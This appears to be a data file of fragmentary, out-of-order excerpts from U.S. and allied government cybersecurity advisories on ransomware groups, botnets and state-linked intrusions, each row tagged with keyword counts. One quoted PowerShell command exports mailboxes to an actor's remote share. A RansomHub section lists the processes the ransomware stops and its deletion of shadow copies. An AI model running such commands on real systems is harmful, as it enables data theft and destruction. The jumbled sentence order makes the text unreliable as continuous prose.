cryptocurrency theft. 1.0  Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities  3  TLP:CLEAR TLP:CLEAR  Purchase VPNs and VPSs [T1583.003]. 1.0  Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities  4  TLP:CLEAR TLP:CLEAR and execute shell commands [T1083, T1021].  Employ Various Ransomware Tools [TA0040]. Actors have used privately  developed ransomware, such as Maui and H0lyGh0st [T1486]. Actors have also  been observed using or possessing publically available tools for encryption, such  as BitLocker, Deadbolt, ech0raix, GonnaCry, Hidden Tear, Jigsaw, LockBit 2.0,  My Little Ransomware, NxRansomware, Ryuk, and YourRansom [T1486]. In  some cases, DPRK actors have portrayed themselves as other ransomware  groups, such as the REvil ransomware group. For IOCs associated with Maui  and H0lyGh0st ransomware usage, please see Appendix B. DPRK cyber actors have been observed  setting ransoms in bitcoin [T1486]. For private companies in the healthcare sector,  actors may threaten to expose a company’s proprietary data to competitors if  ransoms are not paid. 1.0  Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities  5  TLP:CLEAR TLP:CLEAR o bc1q9h7yj79sqm4t536q0fdn7n4y2atsvvl22m28ep  o bc1qj6y72rk039mqpgtcy7mwjd3eum6cx6027ndgmd  o bc1qcp557vltuu3qc6pk3ld0ayagrxuf2thp3pjzpe  o bc1ql8wsflrjf9zlusauynzjm83mupq6c9jz9vnqxg  o bc1qx60ec3nfd5yhsyyxkzkpts54w970yxj84zrdck  o bc1qunqnjdlvqkjuhtclfp8kzkjpvdz9qnk898xczp  o bc1q6024d73h48fnhwswhwt3hqz2lzw6x99q0nulm4  o bc1qwdvexlyvg3mqvqw7g6l09qup0qew80wjj9jh7x  o bc1qavrtge4p7dmcrnvhlvuhaarx8rek76wxyk7dgg  o bc1qagaayd57vr25dlqgk7f00nhz9qepqgnlnt4upu  o bc1quvnaxnpqlzq3mdhfddh35j7e7ufxh3gpc56hca  o bc1qu0pvfmtxawm8s99lcjvxapungtsmkvwyvak6cs  o bc1qg3zlxxhhcvt6hkuhmqml8y9pas76cajcu9ltdl  o bc1qn7a3g23nzpuytchyyteyhkcse84cnylznl3j32  o bc1qhfmqstxp3yp9muvuz29wk77vjtdyrkff4nrxpu  o bc1qnh8scrvuqvlzmzgw7eesyrmtes9c5m78duetf3  o bc1q7qry3lsrphmnw3exs7tkwzpvzjcxs942aq8n0y  o bc1qcmlcxfsy0zlqhh72jvvc4rh7hvwhx6scp27na0  o bc1q498fn0gauj2kkjsg35mlwk2cnxhaqlj7hkh8xy  o bc1qnz4udqkumjghnm2a3zt0w3ep8fwdcyv3krr3jq  o bc1qk0saaw7p0wrwla6u7tfjlxrutlgrwnudzx9tyw  o bc1qyue2pgjk09ps7qvfs559k8kee3jkcw4p4vdp57  o bc1q6qfkt06xmrpclht3acmq00p7zyy0ejydu89zwv  o bc1qmge6a7sp659exnx78zhm9zgrw88n6un0rl9trs  o bc1qcywkd7zqlwmjy36c46dpf8cq6ts6wgkjx0u7cn  Mitigations   Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals  (CPGs) developed by CISA and the U.S. 1.0  Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities  6  TLP:CLEAR TLP:CLEAR   Limit access to data by authenticating and encrypting connections (e.g., using  public key infrastructure certificates in virtual private network (VPN) and transport  layer security (TLS) connections) with network services, Internet of Things (IoT)  medical devices, and the electronic health record system [CPG 3.3].

ESXiArgs Ransomware Virtual Machine Recovery Guidance,2023-02-08,1,"{'phishing': 3, 'ransomware': 21, 'threats_of_violence': 3, 'malware': 4}","•  Require phishing-resistant MFA for as many services as possible [CPG 1.3]—particularly for  webmail, VPNs, accounts that access critical systems, and privileged accounts that manage  backups. •  Implement user training program and phishing exercises to raise awareness among users  about the risks of visiting suspicious websites, clicking on suspicious links, and opening  suspicious attachments. Reinforce the appropriate user response to phishing and  spearphishing emails. TLP:CLEAR Product ID: AA23-039A February 8, 2023 TLP:CLEAR Co-Authored by:  ESXiArgs Ransomware Virtual Machine  Recovery Guidance  SUMMARY  The Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation  (FBI) are releasing this joint Cybersecurity Advisory (CSA) in response to the ongoing ransomware  campaign, known as “ESXiArgs.” Malicious actors may be exploiting known vulnerabilities in VMware  ESXi servers that are likely running unpatched and out-of-service or out-of-date versions of VMware  ESXi software to gain access and deploy ransomware. The ESXiArgs ransomware encrypts  configuration files on ESXi servers, potentially rendering virtual machines (VMs) unusable. Organizations that have fallen victim to ESXiArgs ransomware can use this script to attempt to  recover their files. If malicious actors have compromised your organization with ESXiArgs ransomware, CISA and FBI  recommend following the script and guidance provided in this CSA to attempt to recover access to  your files. CISA | FBI  TLP:CLEAR  Page 2 of 8  |  Product ID: AA23-039A  TLP:CLEAR TECHNICAL DETAILS    Open-source reporting indicates that malicious actors are exploiting known vulnerabilities in VMware  ESXi software to gain access to servers and deploy ESXiArgs ransomware. The actors are likely  targeting end-of-life ESXi servers or ESXi servers that do not have the available ESXi software  patches applied.[1]   ESXiArgs ransomware encrypts certain configuration files on ESXi servers, potentially rendering VMs  unusable. Specifically, the ransomware encrypts configuration files associated with the VMs; it does  not encrypt flat files. Furthermore, payment may also embolden adversaries to target additional organizations,  encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit  activities. Regardless of whether you or your organization have decided to pay the ransom, CISA and  FBI urge you to promptly report ransomware incidents to a local FBI Field Office, or to CISA  at cisa.gov/report. CISA is aware that some organizations have reported  success in recovering files without paying ransoms. CISA and FBI urge you  to promptly report ransomware incidents to a local FBI Field Office, or to CISA at cisa.gov/report. In addition, CISA and FBI recommend organizations apply the following recommendations to prepare  for, mitigate/prevent, and respond to ransomware incidents. Preparing for Ransomware  •  Maintain offline backups of data, and regularly test backup and restoration [CPG 7.3]. These  practices safeguard an organization’s continuity of operations or at least minimize potential  downtime from a ransomware incident and protect against data losses. •  Create, maintain, and exercise a basic cyber incident response plan and associated  communications plan that includes response procedures for a ransomware incident [CPG  7.1, 7.2]. CISA | FBI  TLP:CLEAR  Page 7 of 8  |  Product ID: AA23-039A  TLP:CLEAR Mitigating and Preventing Ransomware  •  Restrict Server Message Block (SMB) Protocol within the network to only access servers that  are necessary and remove or disable outdated versions of SMB (i.e., SMB version 1). Responding to Ransomware Incidents  If a ransomware incident occurs at your organization:  •  Follow your organization’s Ransomware Response Checklist (see Preparing for Ransomware  section). Note: CISA and FBI strongly discourage paying ransoms as doing so does not guarantee files and  records will be recovered. Furthermore, payment may also embolden adversaries to target additional  organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or  fund illicit activities.

Enhanced Visibility and Hardening Guidance for Communications Infrastructure,2024-12-03,4,"{'phishing': 2, 'threats_of_violence': 10}","TLP:CLEAR  CISA | FBI | NSA | ASD’s ACSC | CCCS | NCSC-NZ  TLP:CLEAR  7   Require phishing-resistant multi-factor authentication (MFA) for all accounts that access  company systems, networks, and applications, including sensitive administrative access to  routers. MFA should use a combination of credentials and a phishing-resistant secondary  verification method, such as hardware-based PKI or FIDO authentication, to ensure secure  access and prevent unauthorized entry. TLP:CLEAR  CISA | FBI | NSA | ASD’s ACSC | CCCS | NCSC-NZ  TLP:CLEAR  2 Introduction  The Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), Federal  Bureau of Investigation (FBI), Australian Signals Directorate’s (ASD’s) Australian Cyber Security  Centre (ACSC), Canadian Cyber Security Centre (CCCS), and New Zealand’s National Cyber Security  Centre (NCSC-NZ) warn that People’s Republic of China (PRC)-affiliated threat actors compromised  networks of major global telecommunications providers to conduct a broad and significant cyber  espionage campaign. The authoring agencies are releasing this guide to highlight this threat and  provide network engineers and defenders of communications infrastructure with best practices to  strengthen their visibility and harden their network devices against successful exploitation carried  out by PRC-affiliated and other malicious cyber actors. As of this release date, identified exploitations or compromises associated with these threat actors’  activity align with existing weaknesses associated with victim infrastructure; no novel activity has  been observed. High visibility means having detailed insight into network  traffic, user activity, and data flow, allowing network defenders to quickly identify threats, anomalous  behavior, and vulnerabilities. Threat actors have been observed taking  advantage of external-facing vulnerable services and features; therefore, proper visibility  of network and security operations is vital. Reducing vulnerabilities,  improving secure configuration habits, and following best practices limit potential entry points for  PRC-affiliated and other cyber threats. When  properly implemented, out-of-band management can mitigate many threat actor tactics,  techniques, and procedures (TTPs).

TLP:CLEAR  TLP:CLEAR  Co-Authored by:   Product ID: AA23-136A          #StopRansomware: BianLian Data Extortion  Group  Summary  Note: This joint Cybersecurity Advisory is part of an ongoing  #StopRansomware effort to publish advisories for network  defenders that detail various ransomware variants and  ransomware threat actors. The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and the  Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC) are releasing this joint  Cybersecurity Advisory to disseminate known BianLian ransomware and data extortion group IOCs and  TTPs identified through FBI and ASD’S ACSC investigations. (New, November 20, 2024) The reporting agencies are aware of multiple ransomware groups, like  BianLian, that seek to misattribute location and nationality by choosing foreign-language names, almost  May 16, 2023 Actions to take today to mitigate  cyber threats from BianLian data  extortion:    Strictly limit the use of RDP and  other remote desktop services. BianLian is a ransomware developer, deployer, and data  extortion cybercriminal group, likely based in Russia, with multiple Russia-based affiliates. BianLian group originally employed a double-extortion model in which they encrypted victims’ systems after  exfiltrating the data; however, they shifted primarily to exfiltration-based extortion around January 2023  and shifted to exclusively exfiltration-based extortion around January 2024. FBI, CISA, and ASD’S ACSC encourage critical infrastructure organizations and small- and medium-sized  organizations to implement the recommendations in the Mitigations section of this advisory to reduce the  likelihood and impact of BianLian and other ransomware and data extortion incidents. BianLian is a ransomware developer, deployer, and data extortion cybercriminal group. BianLian group originally employed a double-extortion model in  which they exfiltrated financial, client, business, technical, and personal files for leverage and encrypted  victims’ systems. In 2023, FBI observed BianLian shift primarily to exfiltration-based extortion with victims’  systems left intact, and ASD’S ACSC observed BianLian shift exclusively to exfiltration-based extortion. Exfiltration and Impact  BianLian group actors search for sensitive files using PowerShell scripts (See Appendix: Windows  PowerShell and Command Shell Activity) and exfiltrate them for data extortion. Prior to January 2023,  BianLian actors encrypted files [T1486] after exfiltration for double extortion.

In addition, FBI, CISA, and ASD’S ACSC recommend network defenders apply the following mitigations to  limit potential adversarial use of common system and network discovery techniques and to reduce the  impact and risk of compromise by ransomware or data extortion actors:    Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data  and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage  device, or the cloud). We got proofs that  your data was kept with a number of data security violations of data breach  laws. If this leak will take  place they will have to monitor their credit history and identity theft for next  3 years. These #StopRansomware advisories  include recently and historically observed tactics, techniques,  and procedures (TTPs) and indicators of compromise (IOCs) to  help organizations protect against ransomware. Visit  stopransomware.gov to see all #StopRansomware advisories  and to learn more about other ransomware threats and no-cost  resources. (See Figure 1 for a legacy  ransomware note). Figure 1: BianLian Sample Legacy Ransom Note (Look at this instruction.txt)  (New, November 20, 2024) Newer ransomware notes state BianLian group has exfiltrated data and  threaten to leak the exfiltrated data if the ransom is not paid.   Segment networks to prevent the spread of ransomware. Network segmentation can help prevent  the spread of ransomware by controlling traffic flows between—and access to—various  subnetworks, restricting further lateral movement [CPG 2.F].   Identify, detect, and investigate abnormal activity and potential traversal of the indicated  ransomware with a networking monitoring tool. To aid in detecting ransomware, implement a tool  that logs and reports all network traffic, including lateral movement activity on a network. RESOURCES    Stopransomware.gov, a whole-of-government approach with one central location for U.S. ransomware resources and alerts.   cyber.gov.au for the Australian Government’s central location to report cyber incidents, including  ransomware, and to see advice and alerts. The site also provides ransomware advisories for  businesses and organizations to help mitigate cyber threats.   CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide for  guidance on mitigating and responding to a ransomware attack. organizations, Cyber Hygiene Services and Ransomware  Readiness Assessment. Furthermore,   TLP:CLEAR  FBI | CISA | ASD’s ACSC  Page 19 of 23 | Product ID: AA23-136A  TLP:CLEAR  payment may also embolden adversaries to target additional organizations, encourage other criminal  actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you  or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report  ransomware incidents to a local FBI Field Office or CISA at cisa.gov/report. Australian organizations that  have been impacted or require assistance in regard to a ransomware incident can contact ASD’S ACSC via  1300 CYBER1 (1300 292 371) or by submitting a report cyber.gov.au. Note: This advisory, originally published May 2023, was updated  November 20, 2024, with additional TTPs obtained as of June  2024 through FBI and ASD’S ACSC investigations and industry  threat intelligence. BianLian then extorts money by threatening to release data if payment is not made. See the MITRE  ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to  MITRE ATT&CK tactics and techniques. Threat actors can  run portable executable files on victim systems using local user rights, assuming the executable is not  blocked by an application allowlist or antivirus solution. Employees of victim companies have also reported receiving threatening telephone calls from individuals  associated with BianLian group. MITRE ATT&CK Techniques  See Table 2 to Table 14 for all referenced threat actor tactics and techniques in this advisory. Mitigations  FBI, CISA, and ASD’S ACSC recommend organizations implement the mitigations below to improve your  organization’s cybersecurity posture on the basis of the threat actors’ activity. CISA and NIST based the CPGs on existing cybersecurity   TLP:CLEAR  FBI | CISA | ASD’s ACSC  Page 15 of 23 | Product ID: AA23-136A  TLP:CLEAR  frameworks and guidance to protect against the most common and impactful threats and TTPs.   Reduce threat of malicious actors using remote access tools by:  o Auditing remote access tools on your network to identify currently used and/or authorized  software. o PowerShell logs contain valuable data, including historical OS and registry interaction and  possible TTPs of a threat actor’s PowerShell use.   Reduce the threat of credential compromise via the following:  o Place domain admin accounts in the protected users’ group to prevent caching of password  hashes locally. Timely patching is one of the most  efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity  threats. Validate Security Controls  In addition to applying mitigations, FBI, CISA, and ASD’S ACSC recommend exercising, testing, and  validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK  for Enterprise framework in this advisory. Defense Evasion  BianLian group actors use PowerShell [T1059.001] and Windows Command Shell [T1059.003] to disable  antivirus tools [T1562.001], specifically Windows defender and Anti-Malware Scan Interface (AMSI). Collection   FBI observed BianLian group actors using malware (system.exe) that enumerates registry values [T1012]  and files [T1083] and copies clipboard data from users [T1115].

They further stated that the  data obtained could be used to carry out phishing or malware attacks against the  government sector and become an initial access vector. • Require phishing-resistant multifactor authentication for all services to the extent  possible, particularly for webmail, virtual private networks, and accounts that access  critical systems. • In August 2024, a known cyber-criminal on an online forum posted their sale of “High  Quality .gov emails for espionage/social engineering/data extortion/Dada requests,  etc”, which included US credentials. • Segment networks to prevent the spread of malware/ransomware. Network  segmentation can help prevent the spread of malware/ransomware by controlling  traffic flows between—and access to—various subnetworks, and by restricting  adversary lateral movement. • Identify, detect, and investigate abnormal activity and potential traversal of any  indicated malware/ransomware with a networking monitoring tool. To aid in detecting  malware/ransomware, implement a tool that logs and reports all network traffic,  including lateral movement activity on a network. PIN Number  The following information is being provided by the FBI, with no guarantees or warranties, for potential  use at the sole discretion of recipients to protect against cyber threats. While the concept of fraudulent emergency data requests was previously  used by other threat actors, such as Lapsus$, the increase in postings on criminal forums  regarding the process of emergency data requests and sale of compromised credentials has led  to an increase of their use. Threat  As of August 2024, FBI noted an uptick in criminal forum posts regarding conducting fraudulent  emergency data requests and is releasing this notification for industry awareness. According to PayPal, the threat  actor submitted a fraudulent Mutual Legal Assistance Treaty (MLAT) regarding a local  ongoing investigation into child trafficking, which included a case number and legal code  for verification, but the request was ultimately denied by PayPal. Through these partnerships, FBI can assist with identifying vulnerabilities and  mitigating potential threat activity. The cybersecurity landscape is ever-evolving, and cyber threats are becoming increasingly  sophisticated. Timely patching is one  of the most efficient and cost-effective steps an organization can take to minimize its  exposure to cybersecurity threats. If  threat actors are not able to run these tools, they will have difficulty escalating  privileges and/or moving laterally. Threat actors use SMB to propagate malware across organizations."

Principles of Operational Technology Cyber Security,2024-10-01,4,"{'ransomware': 2, 'threats_of_violence': 2, 'malware': 2}","See our guidance on how to report and recover  from ransomware - https://www.cyber.gov.au/report-and-recover/recover-from/ransomware Principle 2: Knowledge of  the business is crucial The more knowledge a business has about itself,  the better that business can protect against,  prepare for and respond to a cyber incident. If the  corporate environment becomes compromised,  through ransomware or other mechanisms,  even if the virtualised OT environment has  not been directly affected, the privileged  IT accounts required to manage the OT  environment would be no longer accessible. In  contrast to corporate IT systems, where leaders  prioritise innovation and rapid development  without concern of threat to life, operational  cyber-physical systems’ leaders must account  for threat to life in daily decision making. Similarly,  safety needs to be informed by cyber security  and an understanding of the threat environment. This level of  information allows a bad actor to create and  test targeted malware, facilitating a greater  range of possible malicious outcomes. Also well understood since 2017’s  Hatman malware, is the need to separate more  critical OT networks such as those essential to  safety, from less critical OT networks."
Iranian Cyber Actors Targeting Personal Accounts to Support Operations,2024-09-27,3,"{'phishing': 6, 'threats_of_violence': 4}","The authoring agencies recommend the following mitigation actions:  Social Engineering/Spoofing  •  Be suspicious of unsolicited contact from any individual you do not know personally or contact  from people you may know but are claiming to be using new accounts or phone numbers. Enterprise Mitigation  •  Implement a user training program with phishing exercises to raise and maintain awareness  among users about risks of visiting malicious websites or opening malicious attachments. Reinforce the appropriate user response to phishing and spear-phishing emails. •  Enable anti-phishing and anti-spoofing security features that block malicious email. •  Configure Sender Policy Framework, DomainKeys Identified Mail, and Domain-based  Message Authentication Reporting and Conformance to prevent spoofing and validate email. •  When available, use single sign on with either Passkeys, alternate Fast Identity Online (FIDO)  authenticators, or Single Sign On backed by a phishing-resistant multi-factor authentication.

The actors may then use the botnet as a  proxy to conceal their identities while deploying distributed denial of service (DDoS) attacks or  compromising targeted U.S. Integrity Technology Group (Integrity Tech), a PRC-based company, has controlled and managed a botnet  active since mid-2021. The botnet has regularly maintained between tens to hundreds of thousands of  compromised devices. As of June 2024, the botnet consisted of over 260,000 devices. Victim devices  which are part of the botnet have been observed in North America, South America, Europe, Africa,  Southeast Asia and Australia. While devices aged beyond their end-of-life dates are known to be more vulnerable to intrusion, many of the  compromised devices in the Integrity Tech-controlled botnet are likely still supported by their respective vendors. Network  defenders are advised to follow the guidance in the mitigations section to protect against the PRC-linked  cyber actors’ botnet activity. Cyber security companies can also leverage the information in this advisory to  assist with identifying malicious activity and reducing the number of devices present in botnets worldwide. Integrity Tech has used  China Unicom Beijing Province Network IP addresses to control and manage the botnet described in this  advisory. In addition to managing the botnet, these same China Unicom Beijing Province Network IP addresses were  used to access other operational infrastructure employed in computer intrusion activities against U.S. A  functioning botnet can be used for a variety of purposes, including malware delivery, distributed denial of  service (DDoS) attacks, or routing nefarious Internet traffic. The botnet uses the Mirai family of malware, designed to hijack IoT devices such as webcams, DVRs, IP  cameras, and routers running Linux-based operating systems. The Mirai source code was posted publicly  on the Internet in 2016, resulting in other hackers creating their own botnets based on the malware. Since  that time, various Mirai botnets have been used to conduct DDoS and other malicious activities against  victim entities within the U.S. The investigated botnet’s customized Mirai malware is a component of a system that automates the  compromise of a variety of devices. To recruit a new “bot,” the botnet system first compromises an  Internet-connected device using one of a variety of known vulnerability exploits (see Appendix B: Observed  CVEs). A variety of subdomains of “w8510.com” were linked to the botnet’s C2 servers. Page 3 of 18  |  Product ID: JCSA-20240918-001    TLP:CLEAR  TLP:CLEAR Botnet Management  A tier of upstream management servers using TCP port 34125 manage the botnet’s C2 servers. These  management servers host a MySQL database which stored information used for the control of the botnet. The management servers hosted an application known as “Sparrow,” which allows users to interact with  the botnet. The code for the Sparrow application, stored within a Git repository, defines functions that allow registered  users to manage and control the botnet and C2 servers, sending tasks to victim devices including DDoS  and exploitation commands to grow the botnet. A subcomponent called “vulnerability arsenal” also allows users to  exploit traditional computer networks through the victim devices in the botnet. Compromised Device Distribution  The following tables approximate the count of devices compromised by the botnet system as of June 2024,  by location and by processor architecture. There were at least 50 different Linux operating system versions  found among botnet nodes. The following guidance applies both to  preventing IoT devices from becoming part of a botnet, as well as to defending networks from botnets  already in operation. Since DDoS attacks originating from botnets may at first  appear similar to normal traffic, it is critical for organizations to define, monitor and prepare for  abnormal traffic volumes.

Secure by Design Alert: Eliminating Cross-Site Scripting Vulnerabilities,2024-09-17,3,{'threats_of_violence': 3},"Vulnerabilities like cross-site scripting (XSS) continue to  appear in software, enabling threat actors to exploit them. These  failures allow threat actors to inject malicious scripts into web applications, exploiting them to manipulate, steal, or  misuse data across different contexts. To further prevent these vulnerabilities, technical leaders should:  •  Review their written threat models,  •  Ensure software validates input for both structure and meaning,1   •  Use modern web frameworks that offer easy-to-use functions for output encoding to ensure proper escaping or  quoting,2  o  By distinguishing user input from application code, these frameworks make it so that the burden doesn’t  fall on developers to correctly escape user input every time."
Russian Military Cyber Actors Target U.S. and Global Critical Infrastructure,2024-09-05,3,"{'phishing': 2, 'ransomware': 1, 'threats_of_violence': 23, 'malware': 26}","  Enable phishing-resistant multifactor authentication (MFA) for all externally facing account services,  especially for webmail, virtual private networks (VPNs), and accounts that access critical systems. Best practice  mitigations include updating Identity and Access Management (IAM) and employing phishing- resistant MFA for all devices and accounts identified as organizational assets.

While not all encompassing, the following are the  most notable threat group names related under MITRE ATT&CK G1003 and commonly used within the  cybersecurity community. Note: Use of these tools should not be  attributed as malicious without analytical evidence to support threat actor use and/or control. Appendix B: Indicators of Compromise lists threat actor IP addresses associated with the activity detailed in  this section. Post-Exploitation  When an exploit is successfully executed on a victim system, the actors can then launch a Meterpreter  payload [T1105], which commonly uses a reverse Transmission Control Protocol (TCP) connection to  initiate communication with the threat actors’ infrastructure [T1095]. As seen in victim incident response  results, actor infrastructure has also been used to compromise multiple mail servers [T1114] and exfiltrate  mail artifacts, such as email messages, using PowerShell [T1059.001] via the following command:  powershell New-MailboxExportRequest – Mailbox <resource> – FilePath `\\{IP  Address}\sharefolder\1.pst`  MITRE ATT&CK Tactics and Techniques  See Table 3 to Table 14 for all referenced threat actor tactics and techniques in this advisory. Mitigations  The authoring agencies recommend organizations implement the mitigations supplied below to improve  organizational cybersecurity posture based on threat actor activity. CISA and NIST based the CPGs on existing cybersecurity  frameworks and guidance to protect against the most common and impactful threats, tactics, techniques,  and procedures.   Conduct regular automated vulnerability scans to perform vulnerability assessments on all network  resources based on threat actor behaviors and known exploitable vulnerabilities (CISA CPG 1.E). organizations can utilize a range of CISA services at no cost, including vulnerability scanning  and testing, to help organizations reduce exposure to threats. Security Controls  In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating  your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for  Enterprise framework in this advisory. al  TLP:CLEAR TLP:CLEAR   CISA: Russia Cyber Threat Overview and Advisories    MITRE: Group G1003 - Ember Bear    MITRE: Impacket    NIST NVD: CVE-2020-1472    NIST NVD: CVE-2021-26084    NIST NVD: CVE-2021-3156    NIST NVD: CVE-2021-4034    NIST NVD: CVE-2022-27666    NIST NVD: CVE-2021-33044    NIST NVD: CVE-2021-33045    NIST NVD: CVE-2022-26134    NIST NVD: CVE-2022-26138    NIST NVD: CVE-2022-3236    MITRE: BloodHound    MITRE: Rclone    MITRE: P.A.S.

GRU Unit 29155 cyber actors began deploying the destructive WhisperGate malware  against multiple Ukrainian victim organizations as early as January 13, 2022. This Cybersecurity Advisory provides tactics, techniques, and procedures (TTPs) associated with Unit  29155 cyber actors—both during and succeeding their deployment of WhisperGate against Ukraine—as  well as further analysis (see Appendix A) of the WhisperGate malware initially published in the joint  advisory, Destructive Malware Targeting Organizations in Ukraine, published February 26, 2022. Unit 29155 actors and their cyber-criminal affiliates commonly maintain accounts on dark web forums; this  has provided the opportunity to obtain various hacker tools such as malware and malware loaders  [T1588.001] like Raspberry Robin and SaintBot. While Unit 29155 cyber actors are best known for their  use of WhisperGate malware against Ukraine, the use of WhisperGate is not unique to the group. Technical  analysis can be found in Appendix A: WhisperGate Malware Analysis.   In one instance shortly following a deployment of WhisperGate malware, Unit 29155 cyber actors  exfiltrated data to mega[.]nz using Rclone [T1567.002].   Cyber actors may have used Raspberry Robin malware in the role of an access broker [T1588.001]. Obtain Capabilities:  Malware  T1588.001  Unit 29155 cyber actors obtain publicly available malware and malware  loaders to support their operations.

TLP:CLEAR  TLP:CLEAR   Co-Authored by:   Product ID: AA24-242A                #StopRansomware: RansomHub Ransomware  Summary  Note: This joint Cybersecurity Advisory is part of an ongoing  #StopRansomware effort to publish advisories for network  defenders that detail various ransomware variants and  ransomware threat actors. These #StopRansomware  advisories include recently and historically observed tactics,  techniques, and procedures (TTPs) and indicators of  compromise (IOCs) to help organizations protect against  ransomware. Visit stopransomware.gov to see all  #StopRansomware advisories and to learn more about other  ransomware threats and no-cost resources. The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the  Multi-State Information Sharing and Analysis Center (MS-ISAC), and the Department of Health and Human  Services (HHS) (hereafter referred to as the authoring organizations) are releasing this joint advisory to  disseminate known RansomHub ransomware IOCs and TTPs. RansomHub is a  ransomware-as-a-service variant—formerly known as Cyclops and Knight—that has established itself as an  efficient and successful service model (recently attracting high-profile affiliates from other prominent  variants such as LockBit and ALPHV). August 29, 2024 Actions to take today to mitigate  cyber threats from ransomware:  •  Install updates for operating  systems, software, and firmware  as soon as they are released. Instead, the note provides victims with a client ID and instructs  them to contact the ransomware group via a unique .onion URL (reachable through the Tor browser). The  ransom note typically gives victims between three and 90 days to pay the ransom (depending on the  affiliate) before the ransomware group publishes their data on the RansomHub Tor data leak site. The authoring organizations encourage network defenders to implement the recommendations in the  Mitigations section of this cybersecurity advisory to reduce the likelihood and impact of ransomware  incidents. Defense Evasion  Cybersecurity researchers have observed affiliates renaming the ransomware executable with innocuous  file names, such as Windows.exe, left on the user’s desktop (C:\Users\%USERNAME%\Desktop) or  downloads (C:\Users\%USERNAME%\Downloads) [T1036]. The  ransomware binary does not normally include any mechanism for data exfiltration. Encryption  RansomHub ransomware has typically leveraged an Elliptic Curve Encryption algorithm called Curve 25519  to encrypt user accessible files on the system [T1486]. To successfully encrypt files that are currently in use, the ransomware  binary will typically attempt to stop the following processes:    ""vmms.exe""    ""msaccess.exe""    ""mspub.exe""    ""svchost.exe""    ""vmcompute.exe""    ""notepad.exe""    ""ocautoupds.exe""    ""ocomm.exe""    ""ocssd.exe""    ""oracle.exe""    ""onenote.exe""    ""outlook.exe""    ""powerpnt.exe""    ""explorer.exe""    ""sql.exe""    ""steam.exe""    ""synctime.exe""    ""vmwp.exe""    ""thebat.exe""    ""thunderbird.exe""    ""visio.exe""    ""winword.exe""    ""wordpad.exe""   TLP:CLEAR  FBI | CISA | MS-ISAC | HHS  Page 7 of 24 | Product ID: AA24-242A  TLP:CLEAR    ""xfssvccon.exe""    ""TeamViewer.exe""    ""agntsvc.exe""    ""dbsnmp.exe""    ""dbeng50.exe""    ""encsvc.exe""  The ransomware binary will attempt to encrypt any files that the user has access to, including user files and  networked shares. The ransomware executable does not typically encrypt executable files. To further inhibit system recovery, the ransomware executable typically leverages the  vssadmin.exe program to delete volume shadow copies [T1490].

Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to—various  subnetworks and by restricting adversary lateral movement.   Identify, detect, and investigate abnormal activity and potential traversal of the indicated  ransomware with a networking monitoring tool [CPG 3.A]. To aid in detecting the ransomware,  implement a tool that logs and reports all network traffic, including lateral movement activity on a  network.

Iran-based Cyber Actors Enabling Ransomware Attacks on US Organizations,2024-08-28,3,"{'ransomware': 19, 'threats_of_violence': 12, 'malware': 2}","TLP:CLEAR Product ID: AA24-241A August 28, 2024  TLP:CLEAR Iran-based Cyber Actors Enabling  Ransomware Attacks on US Organizations  Summary  The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and the  Department of Defense Cyber Crime Center (DC3) are releasing this joint Cybersecurity Advisory (CSA) to  warn network defenders that, as of August 2024, a group of Iran-based cyber actors continues to exploit  U.S. The FBI assesses a significant  percentage of these threat actors’ operations against US organizations are intended to obtain and develop  network access to then collaborate with ransomware affiliate actors to deploy ransomware. The FBI further  assesses these Iran-based cyber actors are associated with the Government of Iran (GOI) and—separate  from the ransomware activity—conduct computer network exploitation activity in support of the GOI (such  as intrusions enabling the theft of sensitive technical data against organizations in Israel and Azerbaijan). A significant percentage of the group’s US-focused cyber activity is in furtherance of  obtaining and maintaining technical access to victim networks to enable future ransomware attacks. More recently, the FBI identified these actors collaborating directly with ransomware affiliates to  enable encryption operations in exchange for a percentage of the ransom payments. These actors have  collaborated with the ransomware affiliates NoEscape[3], Ransomhouse[4], and ALPHV (aka BlackCat)  (#StopRansomware: ALPHV Blackcat). The Iranian cyber actors’ involvement in these ransomware attacks  goes beyond providing access; they work closely with ransomware affiliates to lock victim networks and  strategize on approaches to extort victims. The FBI assesses these actors do not disclose their Iran-based  location to their ransomware affiliate contacts and are intentionally vague as to their nationality and origin. While this technique has traditionally been used to influence  victims to pay ransoms, the FBI does not believe the objective of Pay2Key was to obtain ransom payments. The FBI judges this activity to be separate from the previously  referenced ransomware-enabling activity. This group directs their activity towards countries and  organizations consistent with Iranian state interests, and typically not of interest to the group’s  ransomware affiliate contacts, such as U.S. However, the group’s ransomware activities are likely not  sanctioned by the GOI, as the actors have expressed concern for government monitoring of cryptocurrency  movement associated with their malicious activity. Exfiltration and Impact  After infiltrating victim networks, the actors collaborate with ransomware affiliates (including NoEscape,  Ransomhouse, and ALPHV [aka BlackCat]) in exchange for a percentage of the ransom payments by  providing affiliates with access to victim networks, locking victim networks, and strategizing to extort  victims [T1657].

